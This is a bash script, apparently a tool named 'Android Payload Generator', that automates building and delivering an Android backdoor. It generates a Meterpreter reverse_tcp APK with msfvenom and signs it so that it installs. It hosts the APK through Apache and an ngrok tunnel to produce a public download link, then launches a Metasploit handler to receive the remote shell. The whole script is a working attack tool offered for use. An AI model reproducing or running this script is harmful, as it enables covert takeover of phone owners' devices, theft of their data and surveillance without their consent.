#!/bin/bash

#Colors
white="\033[1;37m"
grey="\033[0;37m"
purple="\033[0;35m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
purple="\033[0;35m"
cyan="\033[0;36m"
cafe="\033[0;33m"
fiuscha="\033[0;35m"
blue="\033[1;34m"

clear

ctrlc () {
read -p "$(echo -e $red[$yellow!$red]$grey Delete .apk? [y/n]  )" descision

service apache2 stop

if [[ $descision == "y" ]]; then
	eval "rm -rf /var/www/html/*.apk"
	eval "rm -rf *.apk"
else
	echo -e "C ya later\n"
fi
exit 1
}

trap ctrlc SIGINT

echo -e "$yellow                                                                                                    
 _                      _                      __                        
|_|__  _| __ _  o  _|  |_) _  \/ |  _  _  _|  /__ _ __  _  __ _ _|_ _  __
| || |(_| | (_) | (_|  |  (_| /  | (_)(_|(_|  \_|(/_| |(/_ | (_| |_(_) | 
\n"

#Checking root privilegies
if [[ $EUID -ne 0 ]]; then
        echo -e "		$yellow[!]$red Execute program as root $yellow[!]"
        echo -e "		$red    Type sudo ./apg.sh"
        exit 1
fi

#Generating payload
function payload() {
#Getting LHOST
read -p "$(echo -e $red[$yellow+$red]$grey Enter LHOST: )" lhost
	echo -e "  \033[1;31mLHOST$grey =>$purple $lhost"
#Getting LPORT
read -p "$(echo -e $red[$yellow+$red]$grey Enter LPORT: )" lport
	echo -e "  \033[1;31mLPORT$grey =>$purple $lport"
#Getting payload name
read -p "$(echo -e $red[$yellow+$red]$grey Enter payload name: )" payload_name
	echo -e "  \033[1;31mPayload Name$white =>$purple $payload_name"

msfvenom -p android/meterpreter/reverse_tcp LHOST=$lhost LPORT=$lport R > $payload_name.apk

echo ""
echo -e "		    $red[$yellow+$red]$yellow Payload successfuly generated $red[$yellow+$red]"
echo ""
}

#Crypt payload
function crypt() {
read -p "$(echo -e $red[$yellow+$red]$grey Do you wanna encrypt the payload $red[$yellow$payload_name.apk$red] $grey[y/n]: )" crypt
if [[ $crypt = "Y" ]]; then
	echo -e "\n  $red[$yellow+$red]$grey Payload encryption started\n"
	keytool -genkey -v -keystore key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
	jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore $payload_name.apk alias_name
	echo -e "\n  $red[$green+$red]$grey Your Payload Has Been Successfully Encrypted $red[$yellow+$red]\n"

elif [[ $crypt = "y" ]]; then
	echo -e "\n  $red[$yellow+$red]$grey Payload encryption started\n"
	keytool -genkey -v -keystore key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
	jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore key.keystore $payload_name.apk alias_name
	echo -e "\n  $red[$yellow+$red]$grey Your payload has been successfully encrypted $red[$yellow+$red]\n"

else
	echo -e "\n  $red[$yellow!$red]$white Payload was not crypted $red[$yellow!$red]\n"
fi	
}

#Starting ngrok
function ngrok_server() {
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v xterm > /dev/null 2>&1 || { echo >&2 "I require xterm but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }

if [[ -e ngrok-stable-linux-386.zip ]]; then
	unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
	chmod +x ngrok
	rm -rf ngrok-stable-linux-386.zip

elif [[ -e ./ngrok ]]; then
	echo -e "ngrok already downloaded\n"
else
	echo -e "Downloading Ngrok...\n"
	wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
fi

echo -e "Starting ngrok server...\n"
eval "xterm -e ./ngrok http 80 > /dev/null 2>&1 &"
sleep 20
echo -e "Direct link:" 
eval "curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o 'http://[0-9a-z]*\.ngrok.io'"
slash="/"
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "http://[0-9a-z]*\.ngrok.io"); echo -e "$link$slash$payload_name.apk\n"
}

#Listener
function listener() {
read -p "$(echo -e $red[$yellow+$red]$grey Do you wanna start a listener [y/n]: )" listener
if [ $listener = "y" ];then
	echo -e "\n  $red[$yellow+$red]$grey Starting a listener .."
	echo -e "use exploit/multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > listener.rc
	echo ""
	xterm -e 'msfconsole -r listener.rc'

elif [ $listener = "Y" ]; then
	echo -e "\n  $red[$yellow+$red]$grey Starting a listener .."
	echo -e "use exploit/multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST $lhost\nset LPORT $lport\nexploit" > listener.rc
	echo ""
	xterm -e 'msfconsole -r listener.rc'

else
	echo -e "\n  $red[$yellow!$red]$grey Skipping...\n"
fi
}

payload
crypt

service apache2 start
#echo -e "$red[$yellow+$red]$grey Choose server to host your backdoor:\n$red[$yellow 1 $red]$grey Apache2\n$red[$yellow 2 $red]$grey Python HTTP server\n"
#read server
#if [ $server = "1" ]; then
#	echo -e "$grey Starting Apache2..."
#	service apache2 start
#else
#	echo -e "$grey Starting Python HTTP server..."
#	xterm -e python3 http_server.py 
#fi

eval "cp $payload_name.apk /var/www/html/"
ngrok_server
listener

read -p "$(echo -e $red[$yellow!$red]$grey Delete .apk? [y/n]  )" descision
service apache2 stop
if [[ $descision == "y" ]]; then
	eval "rm -rf /var/www/html/*.apk"
	eval "rm -rf *.apk"
else
	echo -e "C ya later\n"
fi
